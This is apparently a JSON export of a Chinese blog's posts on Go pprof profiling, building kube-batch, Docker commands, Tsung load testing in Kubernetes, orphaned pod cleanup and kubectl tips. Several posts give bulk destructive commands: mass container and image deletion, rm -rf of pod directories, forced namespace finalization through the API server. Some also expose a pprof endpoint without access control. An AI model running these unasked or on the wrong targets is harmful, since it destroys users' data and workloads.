pprof默认是使用-inuse_space进行统计，还可以使用-inuse-objects查看分配对象的数量。\ngoroutine blocking profile 1  go tool pprof http://localhost:6060/debug/pprof/block   the holders of contended mutexes 1  go tool pprof http://localhost:6060/debug/pprof/mutex   execution trace 该包还导出一个处理程序，该处理程序为“Go Tool Track”命令提供执行跟踪数据。收集5秒钟的执行跟踪\n1 2  wget -O trace.out http://localhost:6060/debug/pprof/trace?seconds=5 go tool trace trace.out   trace查看 trace获取 在环境中获取trace数据\n1 2 3 4 5  # kube-batch pprof # http://10.151.11.61:39999/debug/pprof/ wget -O trace.out http://10.151.11.61:39999/debug/pprof/trace?seconds=10   或者直接本地通过浏览器访问http://10.151.11.61:39999/debug/pprof/ 获取trace数据。\ntrace分析 把环境中获得的trace文件，拷贝到本地，并输入如下命令\n1 2  # go tool trace trace.out go tool trace trace   本地需安装有go环境，此时自动调用浏览器打开trace\n1 2 3 4 5  $ go tool trace trace2021/04/05 12:10:17 Parsing trace...2021/04/05 12:10:20 Splitting trace...2021/04/05 12:10:21 Opening browser. Trace viewer is listening on http://127.0.0.1:50907  使用浏览器打开访问页面如下图 现在可以进行以下项分析\n View trace Goroutine analysis Network blocking profile Synchronization blocking profile Syscall blocking profile Scheduler latency profile User-defined tasks User-defined regions Minimum mutator utilization  常用的有：\n View trace Goroutine analysis Network blocking profile Synchronization blocking profile Syscall blocking profile  all available profiles 若要查看所有可用的配置文件，请在浏览器中打开http://localhost:6060/debug/pprof/。\n1 2  http://localhost:6060/debug/pprof/  使用浏览器打开访问页面如下图 pprof包 pprof包介绍见下链接\npprof包详细内容\n实例分析 问题：k8s部署的一个go程序组件的性能在压测条件下，性能指标（吞吐量、延时）表现不好\n由于是底层程序组件，不易采用日志打印方式来定位问题原因，考虑go pprof分析。 结合程序运行cpu和内存情况，发现内存使用正常，但cpu利用率很高。重点分析cpu profile\npprof配置 pprof server config 在9999端口开启pprof服务\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  // main.go  // pprof import _ \u0026#34;net/http/pprof\u0026#34; func main() { // ...  // pprof  if s.Profiling{ go http.ListenAndServe(\u0026#34;:9999\u0026#34;, nil) } // ... }   pprof service 编辑 service.yaml，使得环境node的39999端口映射到待调试k8s程序\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  apiVersion:v1kind:Servicemetadata:namespace:kube-systemname:kube-batch-prometheus-discoverylabels:k8s-app:kube-batchspec:selector:k8s-app:kube-batch#type: ClusterIPtype:NodePortports:- name:http-metricsport:8080targetPort:8080protocol:TCP# pprof port setting- name:http-pprofnodePort:39999port:9999targetPort:9999protocol:TCP  重启程序和服务，运行压测，待场景触发时，浏览器访问http://node_ip:39999/debug/pprof/\n或者 通过命令行方式获取pprof文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  # http://10.151.11.61:39999/debug/pprof/ ## trace文件 wget -O trace.out http://10.151.11.61:39999/debug/pprof/trace?seconds=10 ## cpu profile，默认30s，进入pprof后，输入svg，导出svg文件 go tool pprof http://10.151.11.61:39999/debug/pprof/profile #type \u0026#34;help \u0026lt;cmd|option\u0026gt;\u0026#34; for more information #(pprof) svg #Generating report in profile001.svg   调度图 浏览器打开之前导出的svg文件，如profile001.svg 可知predicates协程的FilteredList函数cpu占比较大，处理耗时较长。需要进行优化。\ntrace图 优化前，协程运行和执行时间 此时执行时间基本上都在130ms左右，耗时较长，影响性能。\n优化后的pprof 调度图 函数列表信息 对比优化前性能得到改善。\ntrace图 协程运行和执行时间 最后优化结果性能，执行时间基本上都在20ms以内，程序的性能经优化得到改善。\n参考资料  如何获取运行的go程序的profile信息 go package pprof Go程序性能分析方法（一文全解） Go execution tracer Debugging performance issues in Go* programs  ","permalink":"http://bingerambo.com/posts/2021/04/go%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90pprof/","tags":["Go"],"title":"Go程序性能分析pprof"},{"categories":["K8S"],"contents":"编译kube-batch项目和自己开发的压测工具density。\n编译kube-batch 编译kube-batch镜像\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  # go build export GOPATH=/home/wangb/projects export GO111MODULE=\u0026#34;off\u0026#34; cd /home/wangb/projects/src/github.com/kubernetes-sigs/kube-batch make clean make # make image  image_dir=/home/wangb/projects/src/github.com/kubernetes-sigs/kube-batch/deployment/images rm -rf ${image_dir}/kube-batch cp _output/bin/kube-batch ${image_dir} cd ${image_dir} docker build -t kube-batch:test .   编译 density density是自己开发的对k8s调度器和kube-batch调度器进行性能测试的工具\n1 2 3 4 5 6 7  export GOPATH=/home/wangb/projects/ export GO111MODULE=\u0026#34;off\u0026#34; cd /home/wangb/projects/src/github.com/kubernetes-sigs/kube-batch/cmd/perf-test/cmd/density go clean go build -o density   density 测试命令 创建测试namespace，density在density-test命名空间下进行pod调度性能测试\n1  kubectl create namespace density-test   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  # test cmd # pnum 需调度pod总数 # qps density的client发射qps参数，影响pod的创建速率 ./density --pnum 50 --qps 200 ./density --pnum 3 --qps 100 # kube-batch scheduler ./density --name kube-batch --pnum 1000 --qps 1000 # k8s scheduler ./density --name default --pnum 1000 --qps 1000 # kube-batch scheduler ./density --name kube-batch --pnum 5000 --qps 1000 # k8s scheduler ./density --name default --pnum 5000 --qps 1000   清理测试pod资源 1 2 3  # batch delete terminating pods NAMESPACE=density-test kubectl get po -n $NAMESPACE |awk \u0026#39;{print $1}\u0026#39; |xargs kubectl delete pod -n $NAMESPACE --force --grace-period=0   清理namespace：density-test资源 1 2 3 4 5 6 7 8 9 10 11 12 13 14  # 强制删除ns为test- 的资源 kubectl get ns |grep density-test |awk \u0026#39;{print $1}\u0026#39; |xargs kubectl delete ns --force --grace-period=0 cd /tmp/ ns_test=$(kubectl get ns |grep density-test |grep Terminating|awk \u0026#39;{print $1}\u0026#39;) kubectl get namespace ${ns_test} -o json \u0026gt;temp.json sed -i \u0026#39;12,19d\u0026#39; temp.json sed -i \u0026#39;s/},/}/g\u0026#39; temp.json curl -k -H \u0026#34;Content-Type: application/json\u0026#34; -X PUT --data-binary @temp.json 192.168.1.100:8080/api/v1/namespaces/${ns_test}/finalize   ","permalink":"http://bingerambo.com/posts/2021/03/%E7%BC%96%E8%AF%91kube-batch%E5%92%8Cdensity/","tags":["K8S"],"title":"编译kube-batch和density"},{"categories":["Docker"],"contents":"Docker常用操作命令集合，持续更新~~~\n制作自己的镜像 1.从远程仓库拉取一个纯净的 centos 系统镜像 查询 centos 相关的镜像\n1  docker search centos   下载镜像到本地  docker pull 镜像名\n1  docker pull centos   查看镜像  查看本地镜像\ndocker images\n1  docker images |grep centos   创建并进入容器 创建容器  　格式：docker run -dit \u0026ndash;name=容器名 镜像id /bin/bash　查看所有的容器  1  docker ps -a   进入容器  格式：docker exec -it 容器名 /bin/bash　将容器制作成镜像 进入容器并操作完成并退出后，commit当前容器为执行名称镜像  格式：docker commit -m \u0026lsquo;镜像描述\u0026rsquo; -a \u0026lsquo;制作者\u0026rsquo; 容器名 镜像名\n1 2 3 4 5 6 7  # 容器id或名称 cidname=111xxx # 镜像id或名称 midname=wwwxxx docker commit -m \u0026#39;make image\u0026#39; ${cidname} ${midname}   打包镜像  将制作好的镜像打成 tar 包\n格式：docker save -o tar包的名字 镜像名\n1 2 3 4 5 6 7 8 9  # 镜像id或名称 midname=wwwxxx # tar包名 tarname=yyyxxx.img.tar # 保存镜像到tar包 docker save ${midname} -o ${tarname}   使用镜像  1 2 3 4  tarname=yyyxxx.img.tar # 导出tar包输出镜像 docker load -i ${tarname}   [DOCKER]从容器外部复制文件到容器  从外部复制到容器内：  docker cp source container:target_path\n1 2 3 4 5 6 7 8  # 待拷贝文件位置 file_source=xxxx # 容器id或名称 cidname=111xxx # 容器内目标位置 target_path=/tmp docker cp ${file_source} ${cidname}:${target_path}   从容器内部复制到容器外：  docker cp container:source_path output_path\n1 2 3 4 5 6 7 8 9 10  # 容器id或名称 cidname=111xxx # 容器内文件位置 source_path=/tmp # 待拷贝文件输出位置 output_path=/home docker cp ${cidname}:${source_path} ${output_path}   停用全部运行中的容器 1  docker stop $(docker ps -q)   删除全部容器 1  docker rm $(docker ps -aq)   一条命令实现停用并删除容器 1  docker stop $(docker ps -q) \u0026amp; docker rm $(docker ps -aq)   杀死所有正在运行的容器 1  docker kill $(docker ps -a -q)   删除所有已经停止的容器 1  docker rm $(docker ps -a -q)   删除所有未打 dangling 标签的镜像 表示清理当前repo:tag为“”的镜像。在对应的镜像repo:tag构建新的镜像的时候，旧的镜像就会从repo:tag中移走，进而成为“”，这个时候，我们就可以对这些进行清理\n1  docker rmi $(docker images -q -f dangling=true)   删除所有镜像 1  docker rmi $(docker images -q)   强制删除 无法删除的镜像 1 2 3 4 5  # 删除指定镜像 docker rmi -f \u0026lt;IMAGE_ID\u0026gt; # 删除所有镜像 docker rmi -f $(docker images -q)   命令集 1 2 3 4 5 6 7 8 9 10 11 12 13 14  ~/.bash_aliases # 杀死所有正在运行的容器. alias dockerkill=\u0026#39;docker kill $(docker ps -a -q)\u0026#39; # 删除所有已经停止的容器. alias dockercleanc=\u0026#39;docker rm $(docker ps -a -q)\u0026#39; # 删除所有未打标签的镜像. alias dockercleani=\u0026#39;docker rmi $(docker images -q -f dangling=true)\u0026#39; # 删除所有已经停止的容器和未打标签的镜像. alias dockerclean=\u0026#39;dockercleanc || true \u0026amp;\u0026amp; dockercleani\u0026#39;   ","permalink":"http://bingerambo.com/posts/2021/03/docker%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/","tags":["Docker"],"title":"Docker常用操作命令集合"},{"categories":["K8S"],"contents":"在K8S中部署业务压力测试工具tsung，修改并进行了自测验证\nRunning Tsung in Kubernetes This project demonstrate one possible way to run Tsung in Kubernetes using StatefulSet.\nAbout Tsung [Tsung] is an open-source multi-protocol distributed load testing tool written in [Erlang]. With proper setup, Tsung could generate millions of virtual users accessing target endpoints.\nTypically we run Tsung in baremetal machines or virtual machines. In order to launch Tsung in Kubernetes, we have to figure out a way to assign hostnames to Tsung pods because Tsung master have to connect to slaves using their hostnames.\nAbout StatefulSet [StatefulSet] is a beta feature added to Kubernetes in 1.5. It is a controller used to provide unique identity to its Pods. Together with a headless service, we could assign dns name to each pods in the StatefulSet.\nDemo Here is a quick demo showing the process to launch a load test using Tsung in Kubernetes. You could modify tsung-config.yaml to test your own systems.\nCreate Namespace 1  kubectl create namespace tsung   Launch test target We use nginx as a demo target\ntarget.yaml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  ---apiVersion:v1kind:Servicemetadata:labels:app:targetname:targetspec:ports:- port:80protocol:TCPtargetPort:80selector:app:targettype:ClusterIP---apiVersion:extensions/v1beta1kind:Deploymentmetadata:labels:app:targetname:nginxspec:replicas:1selector:matchLabels:app:targettemplate:metadata:labels:app:targetspec:containers:- name:nginx# image: nginximage:10.151.11.61:5000/com.inspur/nginx:1.17.7imagePullPolicy:IfNotPresentresources:limits:cpu:4# schedulerName: kube-batchnodeSelector:# node-role.kubernetes.io/node: \u0026#34;true\u0026#34;node-role.kubernetes.io/master:\u0026#34;true\u0026#34;# perf-test: \u0026#34;true\u0026#34;  1  kubectl create -f target.yaml --namespace tsung   Set Tsung config We will inject Tsung config to master pod using ConfigMap. Modify the settings if you like. 可根据实际测试场景，进行测试如下配置内容调整 tsung-config.yaml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  apiVersion:v1data:config.xml:|\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE tsung SYSTEM \u0026#34;/usr/share/tsung/tsung-1.0.dtd\u0026#34; []\u0026gt; \u0026lt;tsung loglevel=\u0026#34;warning\u0026#34;\u0026gt; \u0026lt;clients\u0026gt; \u0026lt;client host=\u0026#34;tsung-slave-0.tsung-slave.tsung.svc.cluster.local\u0026#34; /\u0026gt; \u0026lt;/clients\u0026gt; \u0026lt;servers\u0026gt; \u0026lt;server host=\u0026#34;target\u0026#34; port=\u0026#34;8000\u0026#34; type=\u0026#34;tcp\u0026#34;/\u0026gt; \u0026lt;/servers\u0026gt; \u0026lt;load\u0026gt; \u0026lt;arrivalphase phase=\u0026#34;1\u0026#34; duration=\u0026#34;1\u0026#34; unit=\u0026#34;minute\u0026#34;\u0026gt; \u0026lt;users arrivalrate=\u0026#34;100\u0026#34; unit=\u0026#34;second\u0026#34;/\u0026gt; \u0026lt;/arrivalphase\u0026gt; \u0026lt;/load\u0026gt; \u0026lt;sessions\u0026gt; \u0026lt;session name=\u0026#34;es_load\u0026#34; weight=\u0026#34;1\u0026#34; type=\u0026#34;ts_http\u0026#34;\u0026gt; \u0026lt;for from=\u0026#34;1\u0026#34; to=\u0026#34;10\u0026#34; incr=\u0026#34;1\u0026#34; var=\u0026#34;counter\u0026#34;\u0026gt; \u0026lt;request\u0026gt; \u0026lt;http url=\u0026#34;/\u0026#34; method=\u0026#34;GET\u0026#34; version=\u0026#34;1.1\u0026#34;\u0026gt;\u0026lt;/http\u0026gt; \u0026lt;/request\u0026gt; \u0026lt;/for\u0026gt; \u0026lt;/session\u0026gt; \u0026lt;/sessions\u0026gt; \u0026lt;/tsung\u0026gt;kind:ConfigMapmetadata:name:tsung-config  1  kubectl create -f tsung-config.yaml --namespace tsung   Launch Tsung slave tsung-slave.yaml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  ---apiVersion:v1kind:Servicemetadata:labels:run:tsung-slavename:tsung-slavespec:clusterIP:Noneselector:run:tsung-slaveports:- port:22type:ClusterIP---apiVersion:apps/v1beta1kind:StatefulSetmetadata:name:tsung-slavespec:serviceName:\u0026#34;tsung-slave\u0026#34;replicas:2template:metadata:labels:run:tsung-slavespec:containers:- name:tsungimage:ddragosd/tsung-docker:1.6.0imagePullPolicy:IfNotPresentenv:- name:SLAVEvalue:\u0026#34;true\u0026#34;# schedulerName: kube-batchnodeSelector:# node-role.kubernetes.io/node: \u0026#34;true\u0026#34;# node-role.kubernetes.io/master: \u0026#34;true\u0026#34;perf-test:\u0026#34;true\u0026#34;  1  kubectl create -f tsung-slave.yaml --namespace tsung   Launch Tsung master Tsung master will begin the test as soon as the Pod boots up. When the test ended, the master process will keep running so that user could access the test report using Tsung web interface.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56  ---apiVersion:v1kind:Servicemetadata:labels:run:tsung-mastername:tsung-masterspec:# clusterIP: None # modifyselector:run:tsung-masterports:- port:8091nodePort:38091# modifysessionAffinity:None# type: ClusterIPtype:NodePort# modify---apiVersion:apps/v1beta1kind:StatefulSetmetadata:name:tsung-masterspec:serviceName:\u0026#34;tsung-master\u0026#34;replicas:1template:metadata:labels:run:tsung-masterspec:containers:- name:tsungimage:ddragosd/tsung-docker:1.6.0imagePullPolicy:IfNotPresentenv:- name:ERL_SSH_PORTvalue:\u0026#34;22\u0026#34;args:- -k- -f- /tsung/config.xml- -F- startvolumeMounts:- mountPath:/tsungname:config-volumevolumes:- configMap:name:tsung-configname:config-volume# schedulerName: kube-batchnodeSelector:# node-role.kubernetes.io/node: \u0026#34;true\u0026#34;node-role.kubernetes.io/master:\u0026#34;true\u0026#34;# perf-test: \u0026#34;true\u0026#34;  1  kubectl create -f tsung-master.yaml --namespace tsung   Access Tsung web interface 1  kubectl port-forward tsung-master-0 -n tsung 8091:8091   If set node-port:38091, Then we could access the web interface at http://master-node-ip:38091. Not need to set port-forward.\nCleanup 1  kubectl delete namespace tsung   1 2 3 4 5 6 7 8 9 10 11 12 13  kubectl create namespace tsung kubectl create -f target.yaml --namespace tsung kubectl create -f tsung-config.yaml --namespace tsung kubectl create -f tsung-slave.yaml --namespace tsung kubectl create -f tsung-master.yaml --namespace tsung # kubectl port-forward tsung-master-0 -n tsung 8091:8091   注意 tsung-config.yaml 的需要跟 target.yaml 的svc配置的port相同\nThen we could access the web interface at http://localhost:8091 or http://master-node-ip:38091\nCleanup 1  kubectl delete namespace tsung   参考  Tsung测试报告详解 Tsung Erlang StatefulSet ","permalink":"http://bingerambo.com/posts/2021/03/%E4%B8%9A%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95tsung-in-k8s/","tags":["K8S"],"title":"业务压力测试tsung-in-k8s"},{"categories":["K8S"],"contents":"记录kubelet残留孤儿pod(Orphaned pod)无法删除的问题分析和解决方法\n问题 查看kubelet日志，错误信息如下：\n1 2 3 4  E0823 10:31:01.847946 1303 kubelet_volumes.go:140] Orphaned pod \u0026#34;19a4e3e6-a562-11e8-9a25-309c23027882\u0026#34; found, but volume paths are still present on disk : There were a total of 2 errors similar to this. Turn up verbosity to see them. E0823 10:31:03.840552 1303 kubelet_volumes.go:140] Orphaned pod \u0026#34;19a4e3e6-a562-11e8-9a25-309c23027882\u0026#34; found, but volume paths are still present on disk : There were a total of 2 errors similar to this. Turn up verbosity to see them.   这些错误信息打印提示出现了Orphaned pod，并且每2秒打印1条记录，会导致系统日志充满kubelet的泛滥打印。影响对系统日志信息的查看。\n分析 原因为，k8s已经删除了该Orphaned pod信息（kubectl get 已经查询不到Orphaned pod），此时，kubelet从pod manager中获取all pods信息时不会有该孤儿pod，但是kubelet在cleanupOrphanedPodDirs操作清理该pod时，发现该pod的卷目录仍存在（或挂载使用中），pod卷目录仍存在且无法删除，就导致该pod在节点上无法删除，并提示Orphaned pod错误信息。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  // cleanupOrphanedPodDirs removes the volumes of pods that should not be // running and that have no containers running. Note that we roll up logs here since it runs in the main loop. func (kl *Kubelet) cleanupOrphanedPodDirs(pods []*v1.Pod, runningPods []*kubecontainer.Pod) error { // If there are still volume directories, do not delete directory  volumePaths, err := kl.getPodVolumePathListFromDisk(uid) if err != nil { orphanVolumeErrors = append(orphanVolumeErrors, fmt.Errorf(\u0026#34;orphaned pod %q found, but error %v occurred during reading volume dir from disk\u0026#34;, uid, err)) continue } if len(volumePaths) \u0026gt; 0 { orphanVolumeErrors = append(orphanVolumeErrors, fmt.Errorf(\u0026#34;orphaned pod %q found, but volume paths are still present on disk\u0026#34;, uid)) continue } // If there are any volume-subpaths, do not cleanup directories  volumeSubpathExists, err := kl.podVolumeSubpathsDirExists(uid) if err != nil { orphanVolumeErrors = append(orphanVolumeErrors, fmt.Errorf(\u0026#34;orphaned pod %q found, but error %v occurred during reading of volume-subpaths dir from disk\u0026#34;, uid, err)) continue } if volumeSubpathExists { orphanVolumeErrors = append(orphanVolumeErrors, fmt.Errorf(\u0026#34;orphaned pod %q found, but volume subpaths are still present on disk\u0026#34;, uid)) continue } }   解决 一般的 我们会直接删除掉这个孤儿pod的目录，该操作需谨慎。\n1 2 3 4  # kubeectl 查询不到该$podid的pod信息，则可以进行清理操作 # 删除该Orphaned pod数据目录 KUBELET_HOME=/var/lib rm -rf ${KUBELET_HOME}/kubelet/pods/$podid   Orphaned pod批量清理 如果系统环境中存在大量的Orphaned pod需求清理，可使用下面脚本批量处理\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  #!/bin/bash  # 这个脚本使用优雅方式进行pod相关挂载卷的卸载处理和卷目录删除，并不手动删除pod目录（其内可能包含pod数据） KUBELET_HOME=/var/lib # 通过系统日志获取到全部孤儿pod的podid # for podid in $(grep \u0026#34;orphaned pod\u0026#34; /var/log/syslog | tail -1 | awk \u0026#39;{print $12}\u0026#39; | sed \u0026#39;s/\u0026#34;//g\u0026#39;); for podid in $(grep \u0026#34;orphaned pod\u0026#34; /var/log/messages | tail -1 | awk \u0026#39;{print $12}\u0026#39; | sed \u0026#39;s/\u0026#34;//g\u0026#39;); do if [ ! -d ${KUBELET_HOME}/kubelet/pods/$podid ]; then break fi if [ -d ${KUBELET_HOME}/kubelet/pods/$podid/volume-subpaths/ ]; then mountpath=$(mount | grep ${KUBELET_HOME}/kubelet/pods/$podid/volume-subpaths/ | awk \u0026#39;{print $3}\u0026#39;) for mntPath in $mountpath; do umount $mntPath done rm -rf ${KUBELET_HOME}/kubelet/pods/$podid/volume-subpaths fi csiMounts=$(mount | grep \u0026#34;${KUBELET_HOME}/kubelet/pods/$podid/volumes/kubernetes.io~csi\u0026#34;) if [ \u0026#34;$csiMounts\u0026#34; != \u0026#34;\u0026#34; ]; then echo \u0026#34;csi is mounted at: $csiMounts\u0026#34; exit 1 else rm -rf ${KUBELET_HOME}/kubelet/pods/$podid/volumes/kubernetes.io~csi fi volumeTypes=$(ls ${KUBELET_HOME}/kubelet/pods/$podid/volumes/) for volumeType in $volumeTypes; do subVolumes=$(ls -A ${KUBELET_HOME}/kubelet/pods/$podid/volumes/$volumeType) if [ \u0026#34;$subVolumes\u0026#34; != \u0026#34;\u0026#34; ]; then echo \u0026#34;${KUBELET_HOME}/kubelet/pods/$podid/volumes/$volumeTypecontents volume: $subVolumes\u0026#34; exit 1 else rmdir ${KUBELET_HOME}/kubelet/pods/$podid/volumes/$volumeType fi done done   参考  OrphanedPod Issue OrphanedPod Found ","permalink":"http://bingerambo.com/posts/2021/03/kubelet%E6%AE%8B%E7%95%99%E5%AD%A4%E5%84%BFpodorphaned-pod%E6%97%A0%E6%B3%95%E5%88%A0%E9%99%A4%E7%9A%84%E9%97%AE%E9%A2%98/","tags":["K8S"],"title":"kubelet残留孤儿pod(Orphaned pod)无法删除的问题"},{"categories":["K8S"],"contents":"K8S常用操作命令集合，持续更新~~~\npod 操作 批量删除terminating pods 1 2 3  # batch delete terminating pods NAMESPACE=kubemark kubectl get po -n $NAMESPACE |grep Terminating |awk \u0026#39;{print $1}\u0026#39; |xargs kubectl delete pod -n $NAMESPACE --force --grace-period=0   [慎用] 删除NAMESPACE下的所有资源 1 2 3  # kubectl delete ns $NAMESPACE NAMESPACE=kubemark kubectl delete ns $NAMESPACE --force --grace-period=0   批量删除 NAMESPACE下的 Init:0/1 状态 pod 1 2  NAMESPACE=kube-system kubectl get po -n $NAMESPACE |grep \u0026#34;Init:0/1\u0026#34; |awk \u0026#39;{print $1}\u0026#39; |xargs kubectl delete pod -n $NAMESPACE --force --grace-period=0   批量删除 NAMESPACE下的 ContainerCreating 状态 pod 1 2  NAMESPACE=kube-system kubectl get po -n $NAMESPACE |grep \u0026#34;ContainerCreating\u0026#34; |awk \u0026#39;{print $1}\u0026#39; |xargs kubectl delete pod -n $NAMESPACE --force --grace-period=0   批量删除集群NAMESPACE下的 ContainerCreating 或 Init:0/1 状态 pod 1 2 3 4 5  NAMESPACE=kube-system kubectl get po -n $NAMESPACE |grep -E \u0026#34;ContainerCreating|Init:0/1\u0026#34; |awk \u0026#39;{print $1}\u0026#39; |xargs kubectl delete pod -n $NAMESPACE --force --grace-period=0 NAMESPACE=aistation kubectl get po -n $NAMESPACE |grep -E \u0026#34;ContainerCreating|Init:0/1\u0026#34; |awk \u0026#39;{print $1}\u0026#39; |xargs kubectl delete pod -n $NAMESPACE --force --grace-period=0   示例：清理kubemark资源 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  # delete hollow-node-sts # kubectl delete -f hollow-node-sts.yaml NAMESPACE=kubemark kubectl get po -n $NAMESPACE |grep -E \u0026#34;Terminating|CrashLoopBackOff|Error\u0026#34; |awk \u0026#39;{print $1}\u0026#39; |xargs kubectl delete pod -n $NAMESPACE --force --grace-period=0 NAMESPACE=kube-system kubectl get po -n $NAMESPACE |grep -E \u0026#34;ContainerCreating|Init:0/1\u0026#34; |awk \u0026#39;{print $1}\u0026#39; |xargs kubectl delete pod -n $NAMESPACE --force --grace-period=0 NAMESPACE=aistation kubectl get po -n $NAMESPACE |grep -E \u0026#34;ContainerCreating|Init:0/1\u0026#34; |awk \u0026#39;{print $1}\u0026#39; |xargs kubectl delete pod -n $NAMESPACE --force --grace-period=0 #NAMESPACE=kubemark #kubectl delete ns $NAMESPACE --force --grace-period=0 # clear nodes kubectl get no |grep \u0026#34;hollow-node\u0026#34; |awk \u0026#39;{print $1}\u0026#39; |xargs kubectl delete no --force --grace-period=0   node 操作 批量删除指定node 1 2  TAGCLASS=\u0026#34;hollow-node-\u0026#34; kubectl get no |grep $TAGCLASS |awk \u0026#39;{print $1}\u0026#39; |xargs kubectl delete no   指定node 打标签 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  # 添加node标签 # kubectl label nodes kube-node-name label_name=label_value kubectl label nodes node61 perf-test=true # 删除node标签 # kubectl label nodes kube-node-name label_name- kubectl label nodes node61 perf-test- # 更新node标签 # kubectl label nodes kube-node-name label_name=label_value --overwrite kubectl label nodes node61 perf-test=true --overwrite kubectl label nodes node53 perf-test=true --overwrite # 显示ndoe标签 kubectl get no --show-labels   namespace操作 1 2 3 4 5 6 7 8 9 10  kubectl get namespace tsung -o json |jq \u0026#39;.spec = {\u0026#34;finalizers\u0026#34;:[]}\u0026#39; \u0026gt;temp.json# 如果没有jq，则输出完整json，并修改kubectl get namespace tsung -o json \u0026gt;temp.json# 修改temp.json中的 spec和 status 字段内容curl -k -H \u0026#34;Content-Type: application/json\u0026#34; -X PUT --data-binary @temp.json 10.151.11.61:8080/api/v1/namespaces/tsung/finalize  强制删除namespace 状态为termiating， 名称为test- 的资源 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  kubectl get ns |grep test- |awk \u0026#39;{print $1}\u0026#39; |xargs kubectl delete ns --force --grace-period=0 # 指定ns_test # ns_test=test-c6gg2n-1 # 或 查找系统中存在的1条ns_test ns_test=$(kubectl get ns |grep test- |awk \u0026#39;{print $1}\u0026#39;) kubectl get namespace ${ns_test} -o json \u0026gt;temp.json # vim temp.json # to delete spec and status fields sed -i \u0026#39;12,19d\u0026#39; temp.json sed -i \u0026#39;s/},/}/g\u0026#39; temp.json # k8s-apiserve url api_url=192.168.2.101:8080 curl -k -H \u0026#34;Content-Type: application/json\u0026#34; -X PUT --data-binary @temp.json ${api_url}:8080/api/v1/namespaces/${ns_test}/finalize   实例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72  [root@node61 perf-test]# kubectl get ns NAME STATUS AGE 0eaea880-7d1c-4d07-8fa5-dc71eb10aa8a Active 5d22h aistation Active 6d default Active 6d13h kube-node-lease Active 6d13h kube-public Active 6d13h kube-system Active 6d13h kubeflow Active 6d kubemark Active 5d23h monitoring Active 4d23h test-pyb3an-1 Terminating 15m [root@node61 perf-test]# cat temp.json { \u0026#34;apiVersion\u0026#34;: \u0026#34;v1\u0026#34;, \u0026#34;kind\u0026#34;: \u0026#34;Namespace\u0026#34;, \u0026#34;metadata\u0026#34;: { \u0026#34;creationTimestamp\u0026#34;: \u0026#34;2021-03-04T08:06:07Z\u0026#34;, \u0026#34;deletionTimestamp\u0026#34;: \u0026#34;2021-03-05T07:20:42Z\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;tsung\u0026#34;, \u0026#34;resourceVersion\u0026#34;: \u0026#34;2875375\u0026#34;, \u0026#34;selfLink\u0026#34;: \u0026#34;/api/v1/namespaces/tsung\u0026#34;, \u0026#34;uid\u0026#34;: \u0026#34;790d2ec0-7cc0-11eb-a786-6c92bf8b7fa6\u0026#34; }, \u0026#34;spec\u0026#34;: { \u0026#34;finalizers\u0026#34;: [ \u0026#34;kubernetes\u0026#34; ] }, \u0026#34;status\u0026#34;: { \u0026#34;phase\u0026#34;: \u0026#34;Terminating\u0026#34; } } [root@node61 perf-test]# vi temp.json [root@node61 perf-test]# [root@node61 perf-test]# [root@node61 perf-test]# [root@node61 perf-test]# curl -k -H \u0026#34;Content-Type: application/json\u0026#34; -X PUT --data-binary @temp.json 10.151.11.61:8080/api/v1/namespaces/tsung/finalize { \u0026#34;kind\u0026#34;: \u0026#34;Namespace\u0026#34;, \u0026#34;apiVersion\u0026#34;: \u0026#34;v1\u0026#34;, \u0026#34;metadata\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;tsung\u0026#34;, \u0026#34;selfLink\u0026#34;: \u0026#34;/api/v1/namespaces/tsung/finalize\u0026#34;, \u0026#34;uid\u0026#34;: \u0026#34;790d2ec0-7cc0-11eb-a786-6c92bf8b7fa6\u0026#34;, \u0026#34;resourceVersion\u0026#34;: \u0026#34;6375674\u0026#34;, \u0026#34;creationTimestamp\u0026#34;: \u0026#34;2021-03-04T08:06:07Z\u0026#34;, \u0026#34;deletionTimestamp\u0026#34;: \u0026#34;2021-03-05T07:20:42Z\u0026#34; }, \u0026#34;spec\u0026#34;: { }, \u0026#34;status\u0026#34;: { \u0026#34;phase\u0026#34;: \u0026#34;Terminating\u0026#34; } }[root@node61 perf-test]# [root@node61 perf-test]# [root@node61 perf-test]# kubectl get ns NAME STATUS AGE 0eaea880-7d1c-4d07-8fa5-dc71eb10aa8a Active 5d22h aistation Active 6d default Active 6d13h kube-node-lease Active 6d13h kube-public Active 6d13h kube-system Active 6d13h 